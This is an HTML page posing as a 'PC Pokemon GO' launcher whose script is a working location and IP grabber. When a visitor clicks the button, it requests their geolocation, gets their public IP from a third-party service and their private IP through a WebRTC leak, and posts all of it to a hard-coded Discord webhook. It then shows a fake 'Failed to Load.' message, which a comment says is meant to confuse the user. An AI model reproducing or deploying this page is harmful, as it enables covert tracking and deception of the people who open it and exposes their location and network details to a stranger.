<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PC Pokemon GO Google Maps API</title>
    <style>
        body {
            background-color: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
            font-family: Arial, sans-serif;
        }
        #buttonContainer {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        #sendLocation {
            background-color: red;
            border: none;
            border-radius: 50%;
            width: 100px;
            height: 100px;
            cursor: pointer;
            font-size: 16px;
            color: white;
            outline: none;
            transition: background-color 0.3s;
        }
        #sendLocation:hover {
            background-color: darkred;
        }
        h1 {
            position: absolute;
            top: 20%;
            font-size: 24px;
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>Click to enter PC Pokemon GO</h1>
    <div id="buttonContainer">
        <button id="sendLocation">•</button>
    </div>
    <audio id="audio" src="funny.mp3" preload="auto"></audio> <!-- Replace with your audio file path -->

    <script>
        const webhookUrl = 'https://discord.com/api/webhooks/1424102601112293407/wqpsY1rZMZaAuIDxOq8TgP75L0mpzozmTv_YGP6B6dBpQ0E6nJJVTr08teeFSJW27von'; // Your Discord webhook URL

        document.getElementById('sendLocation').addEventListener('click', function() {
            // Play audio when button is pressed
            document.getElementById('audio').play().catch(e => console.error("Audio play failed:", e));
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocationWithGeo, showError);
            } else {
                alert("Geolocation is not supported by this browser.");
                sendIPsOnly(); // Send IPs if geolocation is not supported at all
            }
        });

        // Function to handle errors from geolocation
        function showError(error) {
            let errorMessage = "An unknown error occurred.";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = "User denied the request for Geolocation.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    errorMessage = "The request to get user location timed out.";
                    break;
                case error.UNKNOWN_ERROR:
                    errorMessage = "An unknown error occurred.";
                    break;
            }
            console.warn(errorMessage);
            sendIPsOnly(); // Fallback to sending only IP addresses
        }

        // Function to get Public IP from a third-party service
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching public IP:', error);
                return 'Not available';
            }
        }

        // Function to get Private IP using WebRTC
        function getPrivateIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(err => {
                            console.error("Error creating WebRTC offer:", err);
                            resolve("Not available (Offer failed)");
                        });

                    pc.onicecandidate = (ice) => {
                        if (ice && ice.candidate && ice.candidate.candidate) {
                            const ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
                            const match = ipRegex.exec(ice.candidate.candidate);

                            if (match && match[1]) {
                                const ipAddr = match[1];
                                if (ipAddr.startsWith('10.') || ipAddr.startsWith('192.168.') || (ipAddr.startsWith('172.') && (parseInt(ipAddr.split('.')[1], 10) >= 16 && parseInt(ipAddr.split('.')[1], 10) <= 31))) {
                                    pc.onicecandidate = null;
                                    pc.close();
                                    resolve(ipAddr);
                                }
                            }
                        }
                    };

                    setTimeout(() => {
                        if (pc.iceConnectionState !== 'closed') {
                           pc.close();
                           resolve("Not available (Timeout)");
                        }
                    }, 1500);

                } catch (e) {
                    console.error("WebRTC initialization error:", e);
                    resolve("Not available (WebRTC blocked)");
                }
            });
        }

        // Function to send data to Discord
        function sendToDiscord(data) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => {
                // The alert shows regardless of success or failure to confuse the user
                alert('Failed to Load.');
            }).catch(error => {
                console.error('Error sending data to webhook:', error);
                // Still show the alert on error
                alert('Failed to Load.');
            });
        }

        // Main function to gather all data (including location) and send it
        async function sendLocationWithGeo(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const publicIP = await getPublicIP();
            const privateIP = await getPrivateIP();
            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=15`;
            
            const data = {
                content: `
--- New Player Log (Location Accepted) ---
**📍 Location:** [Click to view map](${googleMapsLink})
**🌐 Public IP:** \`${publicIP}\`
**💻 Private IP:** \`${privateIP}\`
------------------------------------------
`
            };
            sendToDiscord(data);
        }

        // Function to send only IP addresses if location is denied/unavailable
        async function sendIPsOnly() {
            const publicIP = await getPublicIP();
            const privateIP = await getPrivateIP();
            
            const data = {
                content: `
--- New Player Log (Location Denied/Unavailable) ---
**🌐 Public IP:** \`${publicIP}\`
**💻 Private IP:** \`${privateIP}\`
----------------------------------------------------
`
            };
            sendToDiscord(data);
        }
    </script>
</body>
</html>
